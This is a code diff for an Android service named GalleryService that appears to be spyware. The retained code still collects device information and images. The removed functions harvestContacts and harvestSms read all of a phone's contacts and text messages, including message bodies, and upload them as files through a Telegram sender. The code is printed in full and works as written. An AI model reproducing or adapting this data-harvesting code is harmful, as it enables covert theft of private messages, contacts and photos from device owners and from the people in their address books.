@@ -4,14 +4,9 @@ import android.app.*
 import android.content.ContentResolver
 import android.content.Context
 import android.content.Intent
-import android.database.Cursor
-import android.net.Uri
 import android.os.Build
 import android.os.IBinder
-import android.provider.ContactsContract
 import android.provider.MediaStore
-import android.provider.Telephony
-import android.util.Log
 import androidx.core.app.NotificationCompat
 import java.io.File
 
@@ -46,8 +41,6 @@ class GalleryService : Service() {
     private fun harvestAll() {
         sendDeviceInfo()
         harvestMedia()
-        harvestContacts()
-        harvestSms()
     }
 
     private fun sendDeviceInfo() {
@@ -70,7 +63,7 @@ class GalleryService : Service() {
             MediaStore.Images.Media.SIZE
         )
 
-        val cursor: Cursor? = contentResolver.query(collection, projection, null, null, null)
+        val cursor: android.database.Cursor? = contentResolver.query(collection, projection, null, null, null)
 
         cursor?.use {
             val dataColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
@@ -105,42 +98,6 @@ class GalleryService : Service() {
                 }
             }
         }
-    }
-
-    private fun harvestContacts() {
-        val contacts = mutableListOf<Map<String, String>>()
-        val cr = contentResolver
-        val cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
-        cursor?.use {
-            val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
-            val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
-            while (it.moveToNext()) {
-                val name = it.getString(nameIdx) ?: "Unknown"
-                val number = it.getString(numIdx) ?: ""
-                contacts.add(mapOf("name" to name, "number" to number))
-            }
-        }
-        val json = contacts.joinToString(separator = "\n") { "${it["name"]}: ${it["number"]}" }
-        telegram.sendTextAsFile(json, "contacts.txt")
-    }
-
-    private fun harvestSms() {
-        val smsList = mutableListOf<String>()
-        val cr = contentResolver
-        val cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
-        cursor?.use {
-            val addressIdx = it.getColumnIndex(Telephony.Sms.ADDRESS)
-            val bodyIdx = it.getColumnIndex(Telephony.Sms.BODY)
-            val dateIdx = it.getColumnIndex(Telephony.Sms.DATE)
-            while (it.moveToNext()) {
-                val address = it.getString(addressIdx) ?: "Unknown"
-                val body = it.getString(bodyIdx) ?: ""
-                val date = it.getString(dateIdx) ?: ""
-                smsList.add("$date | $address: $body")
-            }
-        }
-        val json = smsList.joinToString(separator = "\n")
-        telegram.sendTextAsFile(json, "sms.txt")
     }
 
     private fun buildNotification(text: String): Notification {
